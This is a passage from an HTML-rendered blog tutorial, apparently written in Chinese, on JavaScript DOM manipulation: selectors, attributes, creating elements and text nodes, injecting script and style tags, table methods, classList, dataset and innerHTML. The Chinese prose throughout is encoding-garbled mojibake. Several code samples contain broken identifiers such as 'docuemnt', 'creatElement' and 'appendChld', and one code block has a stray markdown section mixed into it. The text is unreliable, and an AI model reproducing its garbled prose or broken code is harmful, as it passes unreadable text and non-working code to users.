class="line">docuemnt.getElementById(<span class="string">"myDiv"</span>).querySelectorAll(<span class="string">"em"</span>);</span><br><span class="line">docuemnt.querySelectorAll(<span class="string">".selected"</span>);</span><br><span class="line">docuemnt.querySelectorAll(<span class="string">"p strong"</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>æ ¹æ®å…³ç³»æŸ¥æ‰¾å…ƒç´ </em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">childElementCount      // è¿”å›å­å…ƒç´ çš„ä¸ªæ•°</span><br><span class="line">firstElementChild      // æŒ‡å‘ç¬¬ä¸€ä¸ªå­å…ƒç´ </span><br><span class="line">lastELementChild       // æŒ‡å‘æœ€åä¸€ä¸ªå­å…ƒç´ </span><br><span class="line">previousElementSibling // æŒ‡å‘å‰ä¸€ä¸ªåŒè¾ˆå…ƒç´ </span><br><span class="line">nextElementSibling     // æŒ‡å‘åä¸€ä¸ªåŒè¾ˆå…ƒç´ </span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-5-æ–‡æ¡£å†™å…¥"><a href="#2-5-æ–‡æ¡£å†™å…¥" class="headerlink" title="2.5 æ–‡æ¡£å†™å…¥"></a>2.5 æ–‡æ¡£å†™å…¥</h4><p>å°†è¾“å‡ºæµå†™å…¥åˆ°ç½‘é¡µçš„èƒ½åŠ›: <code>write(), writeIn(), open(), close()</code>ã€‚å¦‚æœåœ¨æ–‡æ¡£ç»“æŸåå†è°ƒç”¨<code>document.write()</code>ï¼Œé‚£ä¹ˆè¾“å‡ºçš„å†…å®¹å°†ä¼šé‡å†™æ•´ä¸ªé¡µé¢ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;strong&gt;&quot; + (newDate()).toString() + &quot;&lt;/strong&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;script type=\&quot;text/javascript\&quot; src=\&quot;file.js\&quot;&gt;&quot; + &quot;&lt;\/script&gt;&quot;);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-Element"><a href="#3-Element" class="headerlink" title="3. Element"></a>3. Element</h3><p>Elementç±»å‹ç”¨äºè¡¨ç°XMLæˆ–HTMLå…ƒç´ ï¼Œæä¾›äº†å¯¹å…ƒç´ æ ‡ç­¾åã€å­èŠ‚ç‚¹åŠç‰¹æ€§çš„è®¿é—®ã€‚</p><h4 id="3-1-HTMLå…ƒç´ "><a href="#3-1-HTMLå…ƒç´ " class="headerlink" title="3.1 HTMLå…ƒç´ "></a>3.1 HTMLå…ƒç´ </h4><ul><li><p>å…ƒç´ å±æ€§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element.nodeType    // å…ƒç´ ç±»å‹</span><br><span class="line">element.nodeName    // å…ƒç´ çš„æ ‡ç­¾åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨element.tagName</span><br><span class="line">element.nodeValue   // å…ƒç´ çš„å€¼</span><br><span class="line">element.parentNode  // å¯èƒ½æ˜¯Documentæˆ–Element</span><br></pre></td></tr></table></figure></li><li><p>HTMLElementå­å…ƒç´ <br>æ‰€æœ‰HTMLå…ƒç´ éƒ½ç”±HTMLElementç±»å‹è¡¨ç¤ºï¼Œæ¯ç§å…ƒç´ éƒ½æœ‰ä¸ä¹‹å¯¹åº”çš„ç‰¹æ€§å’Œæ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// åªåˆ—ä¸¾å°‘é‡</span><br><span class="line">HTMLAnchorElement, HTMLBRElement, HTMLButtonElement, HTMLTableColElement, </span><br><span class="line">HTMLDivElement,HTMLFormElement,  HTMLFrameElement, HTMLFrameSetElement, </span><br><span class="line">HTMLHeadingElement, HTMLHeadElement, HTMLImageElement, HTMLInputElement, </span><br><span class="line">HTMLLabelElement, HTMLLIElement, HTMLMetaElement, HTMLOListElement, </span><br><span class="line">HTMLOptionElement, HTMLParagraphElement, HTMLScriptElement, HTMLStyleElement,</span><br><span class="line">HTMLTableElement</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="3-2-å…ƒç´ ç‰¹æ€§"><a href="#3-2-å…ƒç´ ç‰¹æ€§" class="headerlink" title="3.2 å…ƒç´ ç‰¹æ€§"></a>3.2 å…ƒç´ ç‰¹æ€§</h4><ul><li><p>è·å–å…ƒç´ ç‰¹æ€§<br>å¼€å‘äººå‘˜ç»å¸¸ç›´æ¥ä½¿ç”¨å…ƒç´ çš„å±æ€§ï¼Œåªæœ‰åœ¨å–è‡ªå®šä¹‰ç‰¹æ€§å€¼çš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šä½¿ç”¨<code>getAttribute()</code>æ–¹æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"myDiv"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"bd"</span> my_attr=<span class="string">"hello!"</span> style=<span class="string">"display:none"</span> onclick=<span class="string">"f()"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line">div.id                       <span class="comment">// "myDiv"</span></span><br><span class="line">div.className                <span class="comment">// "bd"</span></span><br><span class="line">div.style                    <span class="comment">// è¿”å›ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">div.onclick                  <span class="comment">// è¿”å›ä¸€ä¸ªJSå‡½æ•° || null</span></span><br><span class="line">div.getAttribute(<span class="string">'id'</span>)       <span class="comment">// "myDiv"</span></span><br><span class="line">div.getAttribute(<span class="string">'class'</span>)    <span class="comment">// "bd"</span></span><br><span class="line">div.getAttribute(<span class="string">'my_attr'</span>)  <span class="comment">// "hello!"</span></span><br><span class="line">div.getAttribute(<span class="string">'style'</span>)    <span class="comment">// è¿”å›çš„æ˜¯CSSæ–‡æœ¬</span></span><br><span class="line">div.getAttribute(<span class="string">'onclick'</span>)  <span class="comment">// è¿”å›ç›¸åº”ä»£ç çš„å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®/åˆ é™¤å…ƒç´ ç‰¹æ€§</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.setAttribute(key, val)</span><br><span class="line">div[key] = val;  <span class="comment">// è‡ªå®šä¹‰çš„å±æ€§ä¸ä¼šç”Ÿæ•ˆ</span></span><br><span class="line">div.removeAttribute(key)</span><br></pre></td></tr></table></figure></li><li><p>element.attributes<br>å°†DOMç»“æ„åºåˆ—åŒ–ä¸ºHTMLå­—ç¬¦ä¸²ï¼Œéå†å…ƒç´ ç‰¹æ€§</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; element.attributes.length; i++ )&#123;</span><br><span class="line">  <span class="keyword">var</span> key = element.attributes[i].nodeName;</span><br><span class="line">  <span class="keyword">var</span> val = element.attributes[i].nodeValue;</span><br><span class="line">  arr.push(key + <span class="string">'='</span> + val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="3-3-åˆ›å»ºå…ƒç´ "><a href="#3-3-åˆ›å»ºå…ƒç´ " class="headerlink" title="3.3 åˆ›å»ºå…ƒç´ "></a>3.3 åˆ›å»ºå…ƒç´ </h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line"><span class="comment">// var div = document.createDocumentFragment();</span></span><br><span class="line"><span class="comment">// æ–‡æ¡£ç‰‡æ®µä¸ä¼šè¢«æ·»åŠ åˆ°æ–‡æ¡£æ ‘ä¸­</span></span><br><span class="line">div.id = <span class="string">"myDiv"</span>;</span><br><span class="line">div.className = <span class="string">"box"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæ–‡æœ¬èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">var</span> textNode1 = <span class="built_in">document</span>.createTextNode(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">var</span> textNode2 = <span class="built_in">document</span>.createTextNode(<span class="string">"!!!"</span>);</span><br><span class="line">div.appendChild(textNode1);</span><br><span class="line">div.appendChild(textNode2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// normalize()èƒ½å°†ç›¸é‚»æ–‡æœ¬èŠ‚ç‚¹åˆå¹¶</span></span><br><span class="line">div.normalize();  <span class="comment">// div.firstChild.nodeValue == "hello!!!"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(div);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-4-æ–‡æœ¬èŠ‚ç‚¹"><a href="#3-4-æ–‡æœ¬èŠ‚ç‚¹" class="headerlink" title="3.4 æ–‡æœ¬èŠ‚ç‚¹"></a>3.4 æ–‡æœ¬èŠ‚ç‚¹</h4><p>TextèŠ‚ç‚¹å…·æœ‰ä»¥ä¸‹ç‰¹å¾</p><ul><li>nodeType = 3</li><li>nodeName = â€œ#textâ€</li><li>nodeValue = å…·ä½“æ–‡æœ¬</li><li>parentNodeæ˜¯ä¸€ä¸ªelementï¼Œæ–‡æœ¬èŠ‚ç‚¹æ²¡æœ‰å­èŠ‚ç‚¹</li></ul><p>é€šè¿‡<code>nodeValue</code>å±æ€§æˆ–<code>data</code>å±æ€§è®¿é—®æ–‡æœ¬èŠ‚ç‚¹ä¸­åŒ…å«çš„æ–‡æœ¬ã€‚</p><ul><li>appendData(text): å°†textæ·»åŠ åˆ°èŠ‚ç‚¹çš„æœ«å°¾</li><li>deleteData(offset, count): ä»offsetæŒ‡å®šçš„ä½ç½®å¼€å§‹åˆ é™¤countä¸ªå­—ç¬¦</li><li>insertData(offset, text): åœ¨offsetæŒ‡å®šçš„ä½ç½®æ’å…¥text</li><li>replaceData(offset, count, text): ç”¨textæ›¿æ¢offset+countä¸ºæ­¢çš„æ–‡æœ¬</li><li>splitText(offset): ä»offsetä½ç½®å°†å½“å‰æ–‡æœ¬èŠ‚ç‚¹åˆ†æˆä¸¤ä¸ªæ–‡æœ¬èŠ‚ç‚¹</li><li>substringData(offset, count): æå–offset+countå¤„çš„å­—ç¬¦ä¸²</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¿®æ”¹æ–‡æœ¬</span></span><br><span class="line">&lt;div&gt;hello!<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">div.firstChild.nodeValue = <span class="string">"Some other message"</span></span><br><span class="line">div.firstChild.nodeValue = <span class="string">"&lt;strong&gt;&lt;/strong&gt;"</span>  <span class="comment">// ä¼šè¢«è½¬ä¹‰</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-DOMæ“ä½œæŠ€æœ¯"><a href="#4-DOMæ“ä½œæŠ€æœ¯" class="headerlink" title="4. DOMæ“ä½œæŠ€æœ¯"></a>4. DOMæ“ä½œæŠ€æœ¯</h3><h4 id="4-1-åŠ¨æ€æ·»åŠ js-css"><a href="#4-1-åŠ¨æ€æ·»åŠ js-css" class="headerlink" title="4.1 åŠ¨æ€æ·»åŠ js/css"></a>4.1 åŠ¨æ€æ·»åŠ js/css</h4><ul><li>æ·»åŠ js<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.creatElement(<span class="string">'script'</span>);</span><br><span class="line">script.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">script.src = <span class="string">"client.js"</span>;</span><br><span class="line"><span class="comment">// script.text = "function sayHi()&#123; alert('hi'); &#125;"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></li></ul><p>æ€ä¹ˆçŸ¥é“è„šæœ¬åŠ è½½å®Œæˆäº†ï¼Ÿ</p><ul><li>æ·»åŠ css<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span><br><span class="line">link.rel = <span class="string">"stylesheet"</span>;</span><br><span class="line">link.type = <span class="string">"text/css"</span>;</span><br><span class="line">link.href = <span class="string">"style.css"</span>;</span><br><span class="line"><span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">head.appendChild(link);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cssText</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.createElement(<span class="string">'style'</span>);</span><br><span class="line"><span class="keyword">var</span> css = <span class="string">"body&#123;background-color: red&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(style.styleSheet)&#123;</span><br><span class="line">    style.styleSheet.cssText = css;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    style.appendChild(<span class="built_in">document</span>.createTextNode(css));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(style);</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#### 4.2 æ“ä½œè¡¨æ ¼</span></span><br><span class="line"><span class="string">createTHead() / deleteTHead()  : åˆ›å»º/åˆ é™¤`</span>&lt;thead&gt;<span class="string">`å…ƒç´ </span></span><br><span class="line"><span class="string">createTFoot() / deleteTFoot()  : åˆ›å»º/åˆ é™¤`</span>&lt;tfoot&gt;<span class="string">`å…ƒç´ </span></span><br><span class="line"><span class="string">createCaption() / deleteTFoot(): åˆ›å»º/åˆ é™¤`</span>&lt;caption&gt;<span class="string">`å…ƒç´ </span></span><br><span class="line"><span class="string">*rows*</span></span><br><span class="line"><span class="string">ä¿å­˜ç€`</span>&lt;tbody&gt;<span class="string">`å…ƒç´ ä¸­è¡Œçš„HTMLCollectionã€‚ä½ å¯ä»¥ç”¨`</span>deleteRow(pos)<span class="string">`åˆ é™¤è¡Œï¼Œ`</span>insertRow(pos)<span class="string">`æ’å…¥è¡Œ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*cells*</span></span><br><span class="line"><span class="string">ä¿å­˜ç€`</span>&lt;tr&gt;<span class="string">`å…ƒç´ ä¸­å•å…ƒæ ¼çš„HTMLCollectionã€‚ä½ å¯ä»¥ç”¨`</span>deleteCell(pos)<span class="string">`åˆ é™¤æŒ‡å®šä½ç½®å•å…ƒæ ¼ï¼Œ`</span>insertCell(post)<span class="string">`å‘cellsæŒ‡å®šä½ç½®æ’å…¥ä¸€ä¸ªå•å…ƒæ ¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="keyword">var</span> table = <span class="built_in">document</span>.createElement(<span class="string">'table'</span>);</span><br><span class="line"><span class="keyword">var</span> tbody = <span class="built_in">document</span>.createElement(<span class="string">'tbody'</span>);</span><br><span class="line">table.appendChild(tbody);</span><br><span class="line"></span><br><span class="line">tbody.insertRow(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"123"</span>));</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">1</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">1</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"456"</span>))</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-3-å‡å°‘DOMæ“ä½œ"><a href="#4-3-å‡å°‘DOMæ“ä½œ" class="headerlink" title="4.3 å‡å°‘DOMæ“ä½œ"></a>4.3 å‡å°‘DOMæ“ä½œ</h4><p><code>NodeList, NamedNodeMap å’Œ HTMLCollection</code>è¿™ä¸‰ä¸ªé›†åˆéƒ½æ˜¯åŠ¨æ€çš„ã€‚å½“æ–‡æ¡£ç»“æ„å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå®ƒä»¬éƒ½ä¼šå¾—åˆ°æ›´æ–°ã€‚ä»æœ¬è´¨ä¸Šï¼Œæ‰€æœ‰NodeListå¯¹è±¡éƒ½æ˜¯åœ¨è®¿é—®DOMæ–‡æ¡£æ—¶å®æ—¶è¿è¡Œçš„æŸ¥è¯¢ã€‚</p><p>ä¸‹åˆ—ä»£ç ä¼šå¯¼è‡´æ— é™å¾ªç¯ã€‚æ¯æ¬¡å¾ªç¯å¯¹æ¡ä»¶<code>i &lt; divs.length</code>æ±‚å€¼ï¼Œæ„å‘³ç€ä¼šè¿è¡Œå–å¾—æ‰€æœ‰<code>&lt;div&gt;</code>å…ƒç´ çš„æŸ¥è¯¢ã€‚DOMæ“ä½œå¾€å¾€æ˜¯JSç¨‹åºä¸­å¼€é”€æœ€å¤§çš„éƒ¨åˆ†ï¼Œ<em>è®¿é—®NodeListå¯¼è‡´çš„é—®é¢˜æœ€å¤š</em>ã€‚NodeListæ˜¯â€œåŠ¨æ€çš„â€ï¼Œæ¯æ¬¡è®¿é—®NodeListå¯¹è±¡ï¼Œéƒ½ä¼šè¿è¡Œä¸€æ¬¡æŸ¥è¯¢ï¼Œæœ‰é‰´äºæ­¤ï¼Œæœ€å¥½å°±æ˜¯å°½é‡å‡å°‘DOMæ“ä½œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"div"</span>);</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; divs.length; i++ )&#123;</span><br><span class="line">  div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChld(div);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="5-HTML5"><a href="#5-HTML5" class="headerlink" title="5. HTML5"></a>5. HTML5</h3><h4 id="5-1-class"><a href="#5-1-class" class="headerlink" title="5.1 class"></a>5.1 class</h4><ul><li><p>document.getElementsByClassName</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementsByClassName(<span class="string">"username current"</span>)</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>).getElementsByClassName(<span class="string">"selected"</span>)</span><br></pre></td></tr></table></figure></li><li><p>classList<br>classNameæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒHTML5æ–°å¢äº†æ“ä½œç±»åçš„æ–¹æ³•ï¼Œé€šè¿‡classListæ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ç±»å</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div.classList.remove(<span class="string">"disabled"</span>)</span><br><span class="line">div.classList.add(<span class="string">"current"</span>)</span><br><span class="line">div.classList.contains(<span class="string">"bd"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ—è¡¨å­˜åœ¨å·²ç»ç»™å®šçš„å€¼ï¼Œåˆ é™¤å®ƒï¼›åˆ—è¡¨ä¸­æ²¡æœ‰ç»™å®šçš„å€¼ï¼Œæ·»åŠ å®ƒ</span></span><br><span class="line">div.classList.toggle(<span class="string">"user"</span>)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-focus"><a href="#5-2-focus" class="headerlink" title="5.2 focus()"></a>5.2 focus()</h4><p><code>document.activeElement</code>å§‹ç»ˆä¼šå¼•ç”¨DOMä¸­å½“å‰è·å¾—ç„¦ç‚¹çš„å…ƒç´ ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡æ¡£åˆšåˆšåŠ è½½å®Œæ—¶ï¼Œdocument.activeElementä¿å­˜çš„æ˜¯document.bodyå…ƒç´ <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> button = <span class="built_in">document</span>.getElementById(<span class="string">"myButton"</span>);</span><br><span class="line">button.focus()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.activeElement === button)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(docuemnt.hasFocus())                <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-å…¶ä»–"><a href="#5-3-å…¶ä»–" class="headerlink" title="5.3 å…¶ä»–"></a>5.3 å…¶ä»–</h4><ul><li>document.readyState<br>document.readyState === â€œloadingâ€ æ­£åœ¨åŠ è½½æ–‡æ¡£<br>document.readyState === â€œcompleteâ€ å·²ç»åŠ è½½å®Œæ–‡æ¡£</li></ul><p><br></p><ul><li>data-<br>ä¸ºå…ƒç´ æä¾›ä¸æ¸²æŸ“æ— æ— å…³çš„ä¿¡æ¯ï¼Œè¦æ·»åŠ å‰ç¼€data-<br><code>&lt;div class=&quot;myDiv&quot; data-appID=&quot;12345&quot; data-myname=&quot;Nicholas&quot;&gt;&lt;div&gt;</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å€¼</span></span><br><span class="line"><span class="keyword">var</span> appId = div.dataset.appId;</span><br><span class="line"><span class="comment">// è®¾ç½®å€¼</span></span><br><span class="line">div.dataset.appId = <span class="string">"23456"</span>;</span><br><span class="line"><span class="comment">// åˆ¤æ–­æœ‰æ— å€¼</span></span><br><span class="line"><span class="keyword">if</span> (div.dataset.myname)&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>contains()<br>æ£€æŸ¥æŸä¸ªèŠ‚ç‚¹æ˜¯ä¸æ˜¯å¦ä¸€ä¸ªèŠ‚ç‚¹çš„åä»£ã€‚ <code>compareDocumentPosition()</code>ä¹Ÿèƒ½ç¡®å®šèŠ‚ç‚¹é—´çš„å…³ç³»ï¼Œæ”¯æŒIE9+ã€‚è¿”å›1-æ— å…³ï¼Œ 2-ä½äºå‚è€ƒèŠ‚ç‚¹å‰ï¼Œ 4- ä½äºå‚è€ƒèŠ‚ç‚¹åï¼Œ 8-åŒ…å«ï¼Œ 16-è¢«åŒ…å«ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.documentElement.contains(<span class="built_in">document</span>.body)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.compareDocumentPosition(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>æ’å…¥æ ‡è®°</li></ul><ol><li><p>innerHTML<br>ç›´æ¥æ’å…¥HTMLå­—ç¬¦ä¸²ã€‚é€šè¿‡innerHTMLæ’å…¥scriptå…ƒç´ å¹¶ä¸ä¼šæ‰§è¡Œå…¶ä¸­çš„è„šæœ¬ï¼Œä½†æ˜¯æ”¯æŒé€šè¿‡innerHTMLæ’å…¥styleå…ƒç´ ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = <span class="string">"hello &amp; welcome, &lt;p&gt;reader!&lt;/p&gt;"</span></span><br><span class="line"><span class="built_in">console</span>.log(div.innerHTML)</span><br></pre></td></tr></table></figure></li><li><p>outerHTML<br>è¿”å›è°ƒç”¨å®ƒçš„å…ƒç´ åŠæ‰€æœ‰å­èŠ‚ç‚¹çš„HTMLæ ‡ç­¾</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.outerHTML = <span class="string">"hello &amp; welcome, &lt;p&gt;reader!&lt;/p&gt;"</span></span><br><span class="line"><span class="built_in">console</span>.log(div.outerHTML)</span><br></pre></td></tr></table></figure></li><li><p>insertAdjacentHTML<br>æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šæ’å…¥ä½ç½®å’Œè¦æ’å…¥çš„HTMLæ–‡æœ¬ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½œä¸ºå‰ä¸€ä¸ªåŒè¾ˆå…ƒç´ æ’å…¥</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'beforebegin'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½œä¸ºåä¸€ä¸ªåŒè¾ˆå…ƒç´ æ’å…¥</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'afterend'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½œä¸ºç¬¬ä¸€ä¸ªå­å…ƒç´ æ’å…¥</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'afterbegin'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€ä¸ºæœ€åä¸€ä¸ªå­å…ƒç´ æ’å…¥</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'beforeend'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br></pre></td></tr></table></figure></li></ol><p>åœ¨ä½¿ç”¨innerHTML, outerHTML, insertAdjacentHTML()æ–¹æ³•æ—¶ï¼Œæœ€å¥½å…ˆæ‰‹å·¥åˆ é™¤è¯åˆ«æ›¿æ¢çš„å…ƒç´ 